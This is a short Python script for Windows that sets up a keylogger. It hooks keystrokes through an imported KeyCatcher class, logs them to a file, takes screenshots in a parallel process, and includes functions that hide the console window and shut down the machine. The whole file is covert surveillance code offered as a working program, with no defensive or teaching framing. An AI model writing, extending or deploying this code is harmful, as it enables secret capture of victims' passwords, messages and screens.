import os
from KeyCatcher import KeyCatcher
import pythoncom
from multiprocessing import Process
import time
import win32console
import win32gui


def shutdown():
    os.system('shutdown -s')
    return


def hide_console():
    """
    hide the console window
    """
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def main():
    key_logger = KeyCatcher()
    key_logger.set_key_hook()
    key_logger.set_data_file("data_file.log")
    p = Process(target=key_logger.take_screen_shot)
    p.start()
    wait_for_messages_forever()


def wait_for_messages_forever():
    pythoncom.PumpMessages()


def receive_messages_multiprocessing():
    # set process
    p = Process(target=wait_for_messages_forever)
    p.start()
    return


if __name__ == '__main__':
    main()